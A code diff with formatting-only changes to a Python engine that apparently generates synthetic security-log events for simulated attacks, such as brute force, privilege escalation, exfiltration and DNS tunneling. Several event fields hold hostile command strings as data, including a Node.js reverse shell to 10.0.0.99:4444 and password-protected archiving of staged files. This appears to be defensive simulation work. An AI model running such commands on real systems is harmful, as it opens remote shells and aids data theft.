@@ -187,7 +187,7 @@ class AttackScenarioEngine:
                     "dst_ip": "",
                     "user": self._rng.choice(["root", "admin", "deploy", target_user or "admin"]),
                     "auth_method": indicators.get("protocol", "SSH").upper(),
-                    "description": f"Failed SSH login attempt #{i+1} from {src_ip}",
+                    "description": f"Failed SSH login attempt #{i + 1} from {src_ip}",
                 })
 
             # One successful login after the failures
@@ -306,7 +306,7 @@ class AttackScenarioEngine:
                 "src_ip": "",
                 "user": target_user,
                 "process_name": "sudo",
-                "command_line": f"sudo su - root",
+                "command_line": "sudo su - root",
                 "description": f"Privilege escalation: {target_user} used sudo to become root",
             })
 
@@ -412,7 +412,7 @@ class AttackScenarioEngine:
                 "src_ip": "",
                 "user": target_user,
                 "process_name": "7z.exe",
-                "command_line": f"7z a -p{self._rng.choice(['secret','P@ss'])} C:\\temp\\archive.7z C:\\staging\\*",
+                "command_line": f"7z a -p{self._rng.choice(['secret', 'P@ss'])} C:\\temp\\archive.7z C:\\staging\\*",
                 "description": "Data compressed into password-protected archive",
             })
 
@@ -420,11 +420,11 @@ class AttackScenarioEngine:
         elif technique in _EXFIL_TECHNIQUES:
             ts = base_time
             data_size_mb = indicators.get("data_size_mb",
-                           indicators.get("upload_size_mb", 100))
+                                          indicators.get("upload_size_mb", 100))
             dst_ip = indicators.get("destination_ip",
-                     indicators.get("destination",
-                     indicators.get("external_ip",
-                     indicators.get("c2_ip", "185.220.101.42"))))
+                                    indicators.get("destination",
+                                                   indicators.get("external_ip",
+                                                                  indicators.get("c2_ip", "185.220.101.42"))))
             # Large outbound transfer
             events.append({
                 **common,
@@ -651,7 +651,7 @@ class AttackScenarioEngine:
                 "src_host": target_host,
                 "user": target_user,
                 "process_name": "node",
-                "command_line": f"node -e \"require('child_process').exec('bash -i >& /dev/tcp/10.0.0.99/4444 0>&1')\"",
+                "command_line": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/10.0.0.99/4444 0>&1')\"",
                 "description": "Suspicious Node.js execution from npm package",
             })
 
@@ -1046,7 +1046,7 @@ class AttackScenarioEngine:
                     "protocol": "TCP" if "SYN" in attack_type else "UDP",
                     "bytes": self._rng.randint(64, 1500),
                     "user": "",
-                    "description": f"DDoS traffic burst #{i+1}: {attack_type} targeting {indicators.get('target_ip', '10.0.1.10')}",
+                    "description": f"DDoS traffic burst #{i + 1}: {attack_type} targeting {indicators.get('target_ip', '10.0.1.10')}",
                     "tags": ["ddos", f"T{technique}"],
                 })
 
@@ -1065,7 +1065,7 @@ class AttackScenarioEngine:
                     "user": target_user,
                     "domain": f"{label}.{domain}",
                     "query_type": "TXT",
-                    "description": f"DNS tunneling C2 beacon #{i+1}: high-entropy TXT query to {domain}",
+                    "description": f"DNS tunneling C2 beacon #{i + 1}: high-entropy TXT query to {domain}",
                     "tags": ["dns_tunneling", "c2_traffic", "T1071.004"],
                 })
 
